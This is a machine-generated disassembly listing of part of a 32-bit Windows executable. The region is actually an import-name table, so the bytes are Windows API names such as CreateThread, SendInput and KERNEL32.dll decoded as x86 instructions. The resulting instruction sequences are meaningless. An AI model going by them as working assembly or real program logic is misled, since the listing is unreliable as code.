  41dcdb:	ins    DWORD PTR es:[edi],dx
  41dcdc:	gs inc ecx
  41dcde:	add    BYTE PTR [eax],al
  41dce0:	cmp    al,0x3
  41dce2:	dec    edi
  41dce3:	jo     0x41dd4a
  41dce5:	outs   dx,BYTE PTR ds:[esi]
  41dce6:	inc    esi
  41dce7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41dcef:	outs   dx,BYTE PTR ds:[esi]
  41dcf0:	addr16 push edi
  41dcf2:	add    BYTE PTR [eax],al
  41dcf4:	stc    
  41dcf5:	add    cl,BYTE PTR [ecx+0x73]
  41dcf8:	inc    edx
  41dcf9:	popa   
  41dcfa:	fs push ebx
  41dcfc:	je     0x41dd70
  41dcfe:	imul   ebp,DWORD PTR [esi+0x67],0x57727450
  41dd05:	add    dl,cl
  41dd07:	add    BYTE PTR [ebx+0x72],al
  41dd0a:	gs popa 
  41dd0c:	je     0x41dd73
  41dd0e:	inc    ebp
  41dd0f:	jbe    0x41dd76
  41dd11:	outs   dx,BYTE PTR ds:[esi]
  41dd12:	je     0x41dd55
  41dd14:	add    BYTE PTR [eax],al
  41dd16:	ins    DWORD PTR es:[edi],dx
  41dd17:	add    al,0x55
  41dd19:	outs   dx,BYTE PTR ds:[esi]
  41dd1a:	ins    BYTE PTR es:[edi],dx
  41dd1b:	outs   dx,DWORD PTR ds:[esi]
  41dd1c:	arpl   WORD PTR [ebx+0x46],bp
  41dd1f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x45011300
  41dd27:	outs   dx,BYTE PTR ds:[esi]
  41dd28:	je     0x41dd8f
  41dd2a:	jb     0x41dd6f
  41dd2c:	jb     0x41dd97
  41dd2e:	je     0x41dd99
  41dd30:	arpl   WORD PTR [ecx+0x6c],sp
  41dd33:	push   ebx
  41dd34:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41dd39:	outs   dx,BYTE PTR ds:[esi]
  41dd3a:	add    BYTE PTR [eax],al
  41dd3c:	pop    edi
  41dd3d:	add    al,0x54
  41dd3f:	ins    BYTE PTR es:[edi],dx
  41dd40:	jae    0x41dd89
  41dd42:	gs je  0x41dd9b
  41dd45:	popa   
  41dd46:	ins    BYTE PTR es:[edi],dx
  41dd47:	jne    0x41ddae
  41dd49:	add    BYTE PTR [ebx+0x61654802],ah
  41dd4f:	jo     0x41dd94
  41dd51:	jb     0x41ddb8
  41dd53:	popa   
  41dd54:	je     0x41ddbb
  41dd56:	add    BYTE PTR [eax],al
  41dd58:	dec    ebp
  41dd59:	add    al,0x53
  41dd5b:	ins    BYTE PTR es:[edi],dx
  41dd5c:	gs gs jo 0x41dd60
  41dd60:	jnp    0x41dd63
  41dd62:	inc    esi
  41dd63:	outs   dx,DWORD PTR ds:[esi]
  41dd64:	ins    BYTE PTR es:[edi],dx
  41dd65:	fs push ebx
  41dd67:	je     0x41dddb
  41dd69:	imul   ebp,DWORD PTR [esi+0x67],0x47a0057
  41dd70:	push   esi
  41dd71:	gs jb  0x41ddc7
  41dd74:	gs je  0x41ddba
  41dd77:	outs   dx,DWORD PTR ds:[esi]
  41dd78:	outs   dx,BYTE PTR ds:[esi]
  41dd79:	imul   esi,DWORD PTR fs:[ecx+ebp*2+0x6f],0x73614d6e
  41dd82:	imul   eax,DWORD PTR [eax],0xffffff94
  41dd85:	add    al,0x57
  41dd87:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  41dd8e:	in     eax,dx
  41dd8f:	add    BYTE PTR [ebx+0x72],al
  41dd92:	gs popa 
  41dd94:	je     0x41ddfb
  41dd96:	push   esp
  41dd97:	push   0x64616572
  41dd9c:	add    BYTE PTR [eax],al
  41dd9e:	rol    BYTE PTR [eax],cl
  41dda0:	inc    ebx
  41dda1:	jb     0x41de08
  41dda3:	popa   
  41dda4:	je     0x41de0b
  41dda6:	inc    esi
  41dda7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41ddaf:	outs   dx,BYTE PTR ds:[esi]
  41ddb0:	addr16 push edi
  41ddb2:	add    BYTE PTR [eax],al
  41ddb4:	mov    ah,0x0
  41ddb6:	inc    ebx
  41ddb7:	outs   dx,DWORD PTR ds:[esi]
  41ddb8:	ins    DWORD PTR es:[edi],dx
  41ddb9:	jo     0x41de1c
  41ddbb:	jb     0x41de22
  41ddbd:	push   ebx
  41ddbe:	je     0x41de32
  41ddc0:	imul   ebp,DWORD PTR [esi+0x67],0xfe000057
  41ddc7:	add    BYTE PTR [ebp+eiz*2+0x66],al
  41ddcb:	imul   ebp,DWORD PTR [esi+0x65],0x44736f44
  41ddd2:	gs jbe 0x41de3e
  41ddd5:	arpl   WORD PTR [ebp+0x57],sp
  41ddd8:	add    BYTE PTR [eax],al
  41ddda:	out    0x0,eax
  41dddc:	inc    ebx
  41dddd:	jb     0x41de44
  41dddf:	popa   
  41dde0:	je     0x41de47
  41dde2:	push   ebx
  41dde3:	gs ins DWORD PTR es:[edi],dx
  41dde5:	popa   
  41dde6:	jo     0x41de50
  41dde8:	outs   dx,DWORD PTR ds:[esi]
  41dde9:	jb     0x41de50
  41ddeb:	inc    ecx
  41ddec:	add    BYTE PTR [eax],al
  41ddee:	fadd   QWORD PTR [ebx]
  41ddf0:	push   ebx
  41ddf1:	gs popa 
  41ddf3:	jb     0x41de58
  41ddf5:	push   0x68746150
  41ddfa:	push   edi
  41ddfb:	add    BYTE PTR [eax+eax*1+0x636e6143],ah
  41de02:	gs ins BYTE PTR es:[edi],dx
  41de04:	dec    ecx
  41de05:	outs   dx,DWORD PTR ds:[esi]
  41de06:	add    BYTE PTR [eax],al
  41de08:	add    al,0x3
  41de0a:	dec    esp
  41de0b:	gs popa 
  41de0d:	jbe    0x41de74
  41de0f:	inc    ebx
  41de10:	jb     0x41de7b
  41de12:	je     0x41de7d
  41de14:	arpl   WORD PTR [ecx+0x6c],sp
  41de17:	push   ebx
  41de18:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41de1d:	outs   dx,BYTE PTR ds:[esi]
  41de1e:	add    BYTE PTR [eax],al
  41de20:	inc    ebp
  41de21:	add    al,BYTE PTR [edi+0x65]
  41de24:	je     0x41de79
  41de26:	je     0x41de89
  41de28:	jb     0x41de9e
  41de2a:	jne    0x41de9c
  41de2c:	dec    ecx
  41de2d:	outs   dx,BYTE PTR ds:[esi]
  41de2e:	outs   dx,WORD PTR ds:[esi]
  41de30:	push   edi
  41de31:	add    dl,bl
  41de33:	add    cl,BYTE PTR [ecx+0x73]
  41de36:	push   esi
  41de37:	popa   
  41de38:	ins    BYTE PTR es:[edi],dx
  41de39:	imul   esp,DWORD PTR [esp+ecx*2+0x61],0x6175676e
  41de41:	addr16 gs inc edi
  41de44:	jb     0x41deb5
  41de46:	jne    0x41deb8
  41de48:	add    BYTE PTR [eax],al
  41de4a:	in     al,0x3
  41de4c:	push   ebx
  41de4d:	gs je  0x41de93
  41de50:	outs   dx,DWORD PTR ds:[esi]
  41de51:	ins    DWORD PTR es:[edi],dx
  41de52:	ins    DWORD PTR es:[edi],dx
  41de53:	push   esp
  41de54:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  41de5b:	add    BYTE PTR [edx+0x4],dl
  41de5e:	push   ebx
  41de5f:	jns    0x41ded4
  41de61:	je     0x41dec8
  41de63:	ins    DWORD PTR es:[edi],dx
  41de64:	push   esp
  41de65:	imul   ebp,DWORD PTR [ebp+0x65],0x69466f54
  41de6c:	ins    BYTE PTR es:[edi],dx
  41de6d:	gs push esp
  41de6f:	imul   ebp,DWORD PTR [ebp+0x65],0x32b0000
  41de76:	dec    ebp
  41de77:	outs   dx,DWORD PTR ds:[esi]
  41de78:	jbe    0x41dedf
  41de7a:	inc    esi
  41de7b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0xc5004178
  41de83:	add    al,0x6c
  41de85:	jae    0x41defb
  41de87:	jb     0x41deec
  41de89:	ins    DWORD PTR es:[edi],dx
  41de8a:	jo     0x41def5
  41de8c:	inc    ecx
  41de8d:	add    BYTE PTR [ecx+0x2],cl
  41de90:	inc    edi
  41de91:	gs je  0x41dee7
  41de94:	je     0x41df08
  41de96:	imul   ebp,DWORD PTR [esi+0x67],0x65707954
  41de9d:	inc    ebp
  41de9e:	js     0x41def7
  41dea0:	add    BYTE PTR [eax],al
  41dea2:	fld    QWORD PTR [eax]
  41dea4:	inc    ebx
  41dea5:	jb     0x41df0c
  41dea7:	popa   
  41dea8:	je     0x41df0f
  41deaa:	dec    ebp
  41deab:	jne    0x41df21
  41dead:	gs js  0x41def1
  41deb0:	add    BYTE PTR [eax],al
  41deb2:	dec    ebx
  41deb3:	inc    ebp
  41deb4:	push   edx
  41deb5:	dec    esi
  41deb6:	inc    ebp
  41deb7:	dec    esp
  41deb8:	xor    esi,DWORD PTR [edx]
  41deba:	cs fs ins BYTE PTR es:[edi],dx
  41debd:	ins    BYTE PTR es:[edi],dx
  41debe:	add    BYTE PTR [eax],al
  41dec0:	jno    0x41dec3
  41dec2:	inc    edi
  41dec3:	gs je  0x41df18
  41dec6:	dec    edi
  41dec7:	push   eax
  41dec8:	xor    al,BYTE PTR [eax]
  41deca:	mov    cl,0x0
  41decc:	inc    esp
  41decd:	push   eax
  41dece:	je     0x41df3f
  41ded0:	dec    esp
  41ded1:	push   eax
  41ded2:	add    BYTE PTR [eax],al
  41ded4:	fld    QWORD PTR [ecx]
  41ded6:	push   ebx
  41ded7:	gs je  0x41df1e
  41deda:	dec    ecx
  41dedb:	inc    edx
  41dedc:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x6e4500c5
  41dee4:	jne    0x41df53
  41dee6:	inc    esi
  41dee7:	outs   dx,DWORD PTR ds:[esi]
  41dee8:	outs   dx,BYTE PTR ds:[esi]
  41dee9:	je     0x41df31
  41deeb:	popa   
  41deec:	ins    DWORD PTR es:[edi],dx
  41deed:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0xa2005773
  41def5:	add    BYTE PTR [ebx+0x72],al
  41def8:	gs popa 
  41defa:	je     0x41df61
  41defc:	dec    ecx
  41defd:	inc    ebx
  41defe:	push   edi
  41deff:	add    BYTE PTR [ecx+0x1],bh
  41df02:	inc    edi
  41df03:	gs je  0x41df59
  41df06:	jns    0x41df7b
  41df08:	je     0x41df6f
  41df0a:	ins    DWORD PTR es:[edi],dx
  41df0b:	push   eax
  41df0c:	popa   
  41df0d:	ins    BYTE PTR es:[edi],dx
  41df0e:	gs je  0x41df85
  41df11:	gs inc ebp
  41df13:	outs   dx,BYTE PTR ds:[esi]
  41df14:	je     0x41df88
  41df16:	imul   esp,DWORD PTR [ebp+0x73],0x4300ab00
  41df1d:	jb     0x41df84
  41df1f:	popa   
  41df20:	je     0x41df87
  41df22:	push   edx
  41df23:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41df28:	outs   dx,BYTE PTR ds:[esi]
  41df29:	add    BYTE PTR [edi+0x1],bl
  41df2c:	inc    edi
  41df2d:	gs je  0x41df7d
  41df30:	popa   
  41df31:	jo     0x41df80
  41df33:	outs   dx,DWORD PTR ds:[esi]
  41df34:	fs add BYTE PTR gs:[eax],al
  41df38:	lahf   
  41df39:	add    BYTE PTR [ebx+0x72],al
  41df3c:	gs popa 
  41df3e:	je     0x41dfa5
  41df40:	dec    eax
  41df41:	popa   
  41df42:	ins    BYTE PTR es:[edi],dx
  41df43:	data16 je 0x41dfb5
  41df46:	outs   dx,BYTE PTR ds:[esi]
  41df47:	gs push eax
  41df49:	popa   
  41df4a:	ins    BYTE PTR es:[edi],dx
  41df4b:	gs je  0x41dfc2
  41df4e:	gs add dh,ch
  41df51:	add    DWORD PTR [ebx+0x65],edx
  41df54:	je     0x41dfa6
  41df56:	popa   
  41df57:	ins    BYTE PTR es:[edi],dx
  41df58:	gs je  0x41dfcf
  41df5b:	gs inc ebp
  41df5d:	outs   dx,BYTE PTR ds:[esi]
  41df5e:	je     0x41dfd2
  41df60:	imul   esp,DWORD PTR [ebp+0x73],0x43009400
  41df67:	jb     0x41dfce
  41df69:	popa   
  41df6a:	je     0x41dfd1
  41df6c:	inc    esp
  41df6d:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41df74:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  41df78:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xd50070
  41df80:	inc    ebp
  41df81:	js     0x41dff7
  41df83:	push   esp
  41df84:	gs js  0x41dffb
  41df87:	dec    edi
  41df88:	jne    0x41dffe
  41df8a:	push   edi
  41df8b:	add    BYTE PTR [edx+eax*1],cl
  41df8e:	push   esp
  41df8f:	gs js  0x41e006
  41df92:	dec    edi
  41df93:	jne    0x41e009
  41df95:	push   edi
  41df96:	add    BYTE PTR [eax],al
  41df98:	dec    ebx
  41df99:	add    DWORD PTR [edi+0x65],eax
  41df9c:	je     0x41dfe4
  41df9e:	outs   dx,DWORD PTR ds:[esi]
  41df9f:	outs   dx,BYTE PTR ds:[esi]
  41dfa0:	je     0x41dfe6
  41dfa2:	popa   
  41dfa3:	je     0x41e006
  41dfa5:	add    BYTE PTR [edi],bh
  41dfa7:	add    DWORD PTR [edi+0x65],eax
  41dfaa:	je     0x41dff0
  41dfac:	dec    ecx
  41dfad:	inc    edx
  41dfae:	inc    ebx
  41dfaf:	outs   dx,DWORD PTR ds:[esi]
  41dfb0:	ins    BYTE PTR es:[edi],dx
  41dfb1:	outs   dx,DWORD PTR ds:[esi]
  41dfb2:	jb     0x41e008
  41dfb4:	popa   
  41dfb5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41dfb9:	add    BYTE PTR [ecx+eax*1+0x796c6f50],dh
  41dfc0:	ins    BYTE PTR es:[edi],dx
  41dfc1:	imul   ebp,DWORD PTR [esi+0x65],0x1890000
  41dfc8:	inc    edi
  41dfc9:	gs je  0x41e020
  41dfcc:	gs js  0x41e043
  41dfcf:	inc    esi
  41dfd0:	popa   
  41dfd1:	arpl   WORD PTR [ebp+0x57],sp
  41dfd4:	add    BYTE PTR [eax],al
  41dfd6:	jnp    0x41dfd9
  41dfd8:	inc    edi
  41dfd9:	gs je  0x41e030
  41dfdc:	gs js  0x41e053
  41dfdf:	inc    ecx
  41dfe0:	ins    BYTE PTR es:[edi],dx
  41dfe1:	imul   esp,DWORD PTR [edi+0x6e],0x890000
  41dfe8:	inc    ebx
  41dfe9:	jb     0x41e050
  41dfeb:	popa   
  41dfec:	je     0x41e053
  41dfee:	inc    edx
  41dfef:	jb     0x41e066
  41dff1:	jae    0x41e05b
  41dff3:	dec    ecx
  41dff4:	outs   dx,BYTE PTR ds:[esi]
  41dff5:	imul   esi,DWORD PTR fs:[edx+0x65],0x24007463
  41dffd:	add    DWORD PTR [edi+0x65],eax
  41e000:	je     0x41e044
  41e002:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  41e006:	add    BYTE PTR gs:[ecx+eax*1+0x47],bl
  41e00b:	gs je  0x41e05a
  41e00e:	popa   
  41e00f:	jns    0x41e080
  41e011:	jne    0x41e087
  41e013:	add    BYTE PTR [eax+0x65724300],dh
  41e019:	popa   
  41e01a:	je     0x41e081
  41e01c:	push   ebx
  41e01d:	outs   dx,DWORD PTR ds:[esi]
  41e01e:	ins    BYTE PTR es:[edi],dx
  41e01f:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  41e027:	add    ah,al
  41e029:	add    BYTE PTR [ebp+0x6e],al
  41e02c:	jne    0x41e09b
  41e02e:	inc    esi
  41e02f:	outs   dx,DWORD PTR ds:[esi]
  41e030:	outs   dx,BYTE PTR ds:[esi]
  41e031:	je     0x41e079
  41e033:	popa   
  41e034:	ins    DWORD PTR es:[edi],dx
  41e035:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  41e03d:	add    BYTE PTR [eax+0x65724300],cl
  41e043:	popa   
  41e044:	je     0x41e0ab
  41e046:	inc    edx
  41e047:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x646e4970
  41e04f:	imul   esi,DWORD PTR [edx+0x65],0x7463
  41e056:	xchg   DWORD PTR [eax],eax
  41e058:	inc    ebx
  41e059:	jb     0x41e0c0
  41e05b:	popa   
  41e05c:	je     0x41e0c3
  41e05e:	inc    edx
  41e05f:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa7000070
  41e067:	add    BYTE PTR [ebx+0x72],al
  41e06a:	gs popa 
  41e06c:	je     0x41e0d3
  41e06e:	push   eax
  41e06f:	outs   dx,BYTE PTR gs:[esi]
  41e071:	add    BYTE PTR [edx+0x65724300],dl
  41e077:	popa   
  41e078:	je     0x41e0df
  41e07a:	inc    esp
  41e07b:	dec    ecx
  41e07c:	inc    edx
  41e07d:	push   ebx
  41e07e:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41e083:	outs   dx,BYTE PTR ds:[esi]
  41e084:	add    BYTE PTR [eax],al
  41e086:	add    DWORD PTR [eax],0x626d6f43
  41e08c:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  41e093:	add    BYTE PTR [esi+0x1],ah
  41e096:	inc    edi
  41e097:	gs je  0x41e0e8
  41e09a:	gs popa 
  41e09c:	jb     0x41e103
  41e09e:	jae    0x41e114
  41e0a0:	push   eax
  41e0a1:	popa   
  41e0a2:	ins    BYTE PTR es:[edi],dx
  41e0a3:	gs je  0x41e11a
  41e0a6:	gs dec ecx
  41e0a8:	outs   dx,BYTE PTR ds:[esi]
  41e0a9:	fs gs js 0x41e0ad
  41e0ad:	add    BYTE PTR [eax+eax*1+0x696c6c45],bh
  41e0b4:	jo     0x41e129
  41e0b6:	add    BYTE PTR gs:[edx+0x74654701],cl
  41e0bd:	push   esp
  41e0be:	gs js  0x41e135
  41e0c1:	dec    ebp
  41e0c2:	gs je  0x41e137
  41e0c5:	imul   esp,DWORD PTR [ebx+0x73],0x1b80041
  41e0cc:	push   edx
  41e0cd:	gs popa 
  41e0cf:	ins    BYTE PTR es:[edi],dx
  41e0d0:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  41e0d7:	je     0x41e14d
  41e0d9:	add    BYTE PTR gs:[eax],al
  41e0dc:	lar    edx,WORD PTR [ebp+0x6e]
  41e0e0:	jb     0x41e147
  41e0e2:	popa   
  41e0e3:	ins    BYTE PTR es:[edi],dx
  41e0e4:	imul   edi,DWORD PTR [edx+0x65],0x656a624f
  41e0eb:	arpl   WORD PTR [eax+eax*1-0x6],si
  41e0ef:	add    DWORD PTR [ebx+0x65],edx
  41e0f2:	je     0x41e148
  41e0f4:	gs js  0x41e16b
  41e0f7:	inc    ebx
  41e0f8:	outs   dx,DWORD PTR ds:[esi]
  41e0f9:	ins    BYTE PTR es:[edi],dx
  41e0fa:	outs   dx,DWORD PTR ds:[esi]
  41e0fb:	jb     0x41e0fd
  41e0fd:	add    BYTE PTR [esi+0x646e4500],bh
  41e103:	inc    esp
  41e104:	outs   dx,DWORD PTR ds:[esi]
  41e105:	arpl   WORD PTR [eax],ax
  41e107:	add    BYTE PTR [edx+0x1],bh
  41e10a:	inc    edi
  41e10b:	gs je  0x41e161
  41e10e:	jns    0x41e183
  41e110:	je     0x41e177
  41e112:	ins    DWORD PTR es:[edi],dx
  41e113:	push   eax
  41e114:	popa   
  41e115:	ins    BYTE PTR es:[edi],dx
  41e116:	gs je  0x41e18d
  41e119:	gs push ebp
  41e11b:	jae    0x41e182
  41e11d:	add    dh,bl
  41e11f:	add    DWORD PTR [ebx+0x65],edx
  41e122:	je     0x41e168
  41e124:	dec    ecx
  41e125:	inc    edx
  41e126:	imul   esi,DWORD PTR [ebx+esi*2+0x54],0x7665446f
  41e12e:	imul   esp,DWORD PTR [ebx+0x65],0x5301dc00
  41e135:	gs je  0x41e17c
  41e138:	dec    ecx
  41e139:	inc    edx
  41e13a:	inc    ebx
  41e13b:	outs   dx,DWORD PTR ds:[esi]
  41e13c:	ins    BYTE PTR es:[edi],dx
  41e13d:	outs   dx,DWORD PTR ds:[esi]
  41e13e:	jb     0x41e194
  41e140:	popa   
  41e141:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41e145:	add    al,dl
  41e147:	add    DWORD PTR [ebx+0x65],edx
  41e14a:	je     0x41e18d
  41e14c:	bound  ebp,QWORD PTR [edi+0x72]
  41e14f:	je     0x41e1a1
  41e151:	jb     0x41e1c2
  41e153:	arpl   WORD PTR [eax],ax
  41e155:	add    ah,al
  41e157:	add    DWORD PTR [edx+0x65],edx
  41e15a:	jae    0x41e1c5
  41e15c:	jp     0x41e1c3
  41e15e:	push   eax
  41e15f:	popa   
  41e160:	ins    BYTE PTR es:[edi],dx
  41e161:	gs je  0x41e1d8
  41e164:	add    BYTE PTR gs:[edx+eax*1],dl
  41e168:	push   edi
  41e169:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  41e171:	add    dh,cl
  41e173:	add    BYTE PTR [ebp+0x78],al
  41e176:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  41e17a:	gs inc ebx
  41e17c:	ins    BYTE PTR es:[edi],dx
  41e17d:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41e184:	xchg   esi,eax
  41e185:	add    BYTE PTR [ebx+0x72],al
  41e188:	gs popa 
  41e18a:	je     0x41e1f1
  41e18c:	inc    ebp
  41e18d:	ins    BYTE PTR es:[edi],dx
  41e18e:	ins    BYTE PTR es:[edi],dx
  41e18f:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  41e196:	outs   dx,BYTE PTR ds:[esi]
  41e197:	dec    ecx
  41e198:	outs   dx,BYTE PTR ds:[esi]
  41e199:	imul   esi,DWORD PTR fs:[edx+0x65],0xc1007463
  41e1a1:	add    DWORD PTR [edx+0x65],edx
  41e1a4:	ins    DWORD PTR es:[edi],dx
  41e1a5:	outs   dx,DWORD PTR ds:[esi]
  41e1a6:	jbe    0x41e20d
  41e1a8:	inc    esi
  41e1a9:	outs   dx,DWORD PTR ds:[esi]
  41e1aa:	outs   dx,BYTE PTR ds:[esi]
  41e1ab:	je     0x41e1ff
  41e1ad:	gs jae 0x41e21f
  41e1b0:	jne    0x41e224
  41e1b2:	arpl   WORD PTR [ebp+0x57],sp
  41e1b5:	add    BYTE PTR [edi+0x65724300],cl
  41e1bb:	popa   
  41e1bc:	je     0x41e223
  41e1be:	inc    esp
  41e1bf:	inc    ebx
  41e1c0:	push   edi
  41e1c1:	add    BYTE PTR [edx+0x65724300],ch
  41e1c7:	popa   
  41e1c8:	je     0x41e22f
  41e1ca:	push   eax
  41e1cb:	outs   dx,DWORD PTR ds:[esi]
  41e1cc:	ins    BYTE PTR es:[edi],dx
  41e1cd:	jns    0x41e236
  41e1cf:	outs   dx,DWORD PTR ds:[esi]
  41e1d0:	outs   dx,BYTE PTR ds:[esi]
  41e1d1:	push   edx
  41e1d2:	outs   dx,BYTE PTR ds:[si]
  41e1d4:	add    BYTE PTR [eax],al
  41e1d6:	mov    es,WORD PTR [ecx]
  41e1d8:	inc    edi
  41e1d9:	gs je  0x41e232
  41e1dc:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41e1e3:	dec    edi
  41e1e4:	jb     0x41e24d
  41e1e6:	inc    ebp
  41e1e7:	js     0x41e1e9
  41e1e9:	add    BYTE PTR [edi+0x44],al
  41e1ec:	dec    ecx
  41e1ed:	xor    esi,DWORD PTR [edx]
  41e1ef:	cs fs ins BYTE PTR es:[edi],dx
  41e1f2:	ins    BYTE PTR es:[edi],dx
  41e1f3:	add    BYTE PTR [eax+eax*1+0x74736544],dl
  41e1fa:	jb     0x41e26b
  41e1fc:	jns    0x41e241
  41e1fe:	popa   
  41e1ff:	jb     0x41e266
  41e201:	je     0x41e203
  41e203:	add    BYTE PTR [eax+0x61724400],dh
  41e209:	ja     0x41e251
  41e20b:	outs   dx,DWORD PTR ds:[esi]
  41e20c:	arpl   WORD PTR [ebp+0x73],si
  41e20f:	push   edx
  41e210:	arpl   WORD PTR gs:[eax+eax*1-0x4e],si
  41e215:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e219:	fs dec ecx
  41e21b:	ins    DWORD PTR es:[edi],dx
  41e21c:	popa   
  41e21d:	addr16 gs push edi
  41e220:	add    BYTE PTR [eax],al
  41e222:	mov    eax,0x69615702
  41e227:	je     0x41e276
  41e229:	gs jae 0x41e29f
  41e22c:	popa   
  41e22d:	add    BYTE PTR gs:[bx+0x4400],dl
  41e233:	gs jae 0x41e2aa
  41e236:	jb     0x41e2a7
  41e238:	jns    0x41e287
  41e23a:	outs   dx,BYTE PTR gs:[esi]
  41e23c:	jne    0x41e23e
  41e23e:	stos   DWORD PTR es:[edi],eax
  41e23f:	add    BYTE PTR [edx+esi*2+0x61],al
  41e243:	ja     0x41e286
  41e245:	outs   dx,BYTE PTR ds:[esi]
  41e246:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  41e24d:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  41e252:	mov    BYTE PTR [eax],al
  41e254:	inc    esp
  41e255:	gs inc sp
  41e258:	ins    BYTE PTR es:[edi],dx
  41e259:	addr16 push eax
  41e25b:	jb     0x41e2cc
  41e25d:	arpl   WORD PTR [edi+0x0],dx
  41e260:	add    DWORD PTR [eax],eax
  41e262:	inc    ecx
  41e263:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  41e267:	popa   
  41e268:	je     0x41e2cf
  41e26a:	dec    ebx
  41e26b:	gs jns 0x41e2d0
  41e26e:	outs   dx,DWORD PTR ds:[esi]
  41e26f:	popa   
  41e270:	jb     0x41e2d6
  41e272:	dec    esp
  41e273:	popa   
  41e274:	jns    0x41e2e5
  41e276:	jne    0x41e2ec
  41e278:	add    BYTE PTR [eax],al
  41e27a:	data16 add dl,BYTE PTR [ebx+0x65]
  41e27e:	je     0x41e2d4
  41e280:	imul   ebp,DWORD PTR [ebp+0x65],0x75000072
  41e287:	add    DWORD PTR [edi+0x65],eax
  41e28a:	je     0x41e2e3
  41e28c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e293:	js     0x41e309
  41e295:	inc    ecx
  41e296:	add    BYTE PTR [eax],al
  41e298:	and    eax,0x6e655302
  41e29d:	fs dec ecx
  41e29f:	outs   dx,BYTE PTR ds:[esi]
  41e2a0:	jo     0x41e317
  41e2a2:	je     0x41e2a4
  41e2a4:	mov    edi,0x636f4c01
  41e2a9:	imul   edx,DWORD PTR [edi+0x69],0x6e
  41e2ad:	outs   dx,DWORD PTR fs:[esi]
  41e2af:	ja     0x41e306
  41e2b1:	jo     0x41e317
  41e2b3:	popa   
  41e2b4:	je     0x41e31b
  41e2b6:	add    BYTE PTR [eax],al
  41e2b8:	mov    bh,0x2
  41e2ba:	push   edi
  41e2bb:	popa   
  41e2bc:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  41e2c4:	jne    0x41e33a
  41e2c6:	dec    ecx
  41e2c7:	fs ins BYTE PTR es:[edi],dx
  41e2c9:	add    BYTE PTR gs:[eax],al
  41e2cc:	dec    eax
  41e2cd:	add    dl,BYTE PTR [ebx+0x65]
  41e2d0:	je     0x41e31f
  41e2d2:	outs   dx,BYTE PTR gs:[esi]
  41e2d4:	jne    0x41e2d6
  41e2d6:	sub    eax,DWORD PTR [ecx]
  41e2d8:	inc    edi
  41e2d9:	gs je  0x41e329
  41e2dc:	outs   dx,BYTE PTR gs:[esi]
  41e2de:	jne    0x41e2e0
  41e2e0:	adc    eax,DWORD PTR [edx]
  41e2e2:	push   edx
  41e2e3:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  41e2ec:	outs   dx,BYTE PTR ds:[esi]
  41e2ed:	outs   dx,DWORD PTR fs:[esi]
  41e2ef:	ja     0x41e33e
  41e2f1:	gs jae 0x41e367
  41e2f4:	popa   
  41e2f5:	addr16 gs push edi
  41e2f8:	add    BYTE PTR [eax],al
  41e2fa:	push   ebp
  41e2fb:	add    DWORD PTR [edi+0x65],eax
  41e2fe:	je     0x41e353
  41e300:	arpl   WORD PTR [edx+0x6f],si
  41e303:	ins    BYTE PTR es:[edi],dx
  41e304:	ins    BYTE PTR es:[edi],dx
  41e305:	push   eax
  41e306:	outs   dx,DWORD PTR ds:[esi]
  41e307:	jae    0x41e309
  41e309:	add    bh,cl
  41e30b:	add    DWORD PTR [ebp+0x65],ecx
  41e30e:	jae    0x41e383
  41e310:	popa   
  41e311:	addr16 gs inc edx
  41e314:	outs   dx,DWORD PTR ds:[esi]
  41e315:	js     0x41e35c
  41e317:	js     0x41e35a
  41e319:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  41e320:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x65470164
  41e328:	je     0x41e37f
  41e32a:	jo     0x41e390
  41e32c:	popa   
  41e32d:	je     0x41e394
  41e32f:	push   edx
  41e330:	outs   dx,BYTE PTR ds:[si]
  41e332:	add    BYTE PTR [eax],al
  41e334:	mov    dh,0x1
  41e336:	dec    esp
  41e337:	outs   dx,DWORD PTR ds:[esi]
  41e338:	popa   
  41e339:	fs dec ebp
  41e33b:	outs   dx,BYTE PTR gs:[esi]
  41e33d:	jne    0x41e380
  41e33f:	add    BYTE PTR [ecx],cl
  41e341:	add    BYTE PTR [ecx+0x70],al
  41e344:	jo     0x41e3ab
  41e346:	outs   dx,BYTE PTR ds:[esi]
  41e347:	fs dec ebp
  41e349:	outs   dx,BYTE PTR gs:[esi]
  41e34b:	jne    0x41e3a4
  41e34d:	add    BYTE PTR [ebp+0x0],bl
  41e350:	inc    ebx
  41e351:	jb     0x41e3b8
  41e353:	popa   
  41e354:	je     0x41e3bb
  41e356:	dec    ecx
  41e357:	arpl   WORD PTR [edi+0x6e],bp
